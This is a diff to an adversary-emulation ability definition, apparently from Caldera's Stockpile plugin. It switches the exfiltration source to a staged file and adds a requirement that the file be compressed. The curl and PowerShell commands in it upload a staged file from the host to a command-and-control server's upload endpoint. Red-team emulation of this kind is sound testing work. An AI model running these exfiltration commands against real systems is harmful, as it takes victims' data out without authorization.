@@ -11,18 +11,18 @@
     darwin:
       sh:
         command: |
-          curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
+          curl -F "data=@#{file.staged_at}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
     linux:
       sh:
         command: |
-          curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
+          curl -F "data=@#{file.staged_at}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
     windows:
       psh,pwsh:
         # REF: https://stackoverflow.com/a/45409728
         command: |
           $ErrorActionPreference = 'Stop';
-          $fieldName = "#{host.dir.compress}";
-          $filePath = "#{host.dir.compress}";
+          $fieldName = "#{file.staged_at}";
+          $filePath = "#{file.staged_at}";
           $url = "#{server}/file/upload";
 
           Add-Type -AssemblyName 'System.Net.Http';
@@ -40,4 +40,7 @@
           $result.EnsureSuccessStatusCode();
   requirements:
     - plugins.stockpile.app.requirements.paw_provenance:
-      - source: host.dir.compress
+      - source: file.staged_at
+    - plugins.stockpile.app.requirements.basic:
+        - source: file.staged_at
+          edge: is_compressed
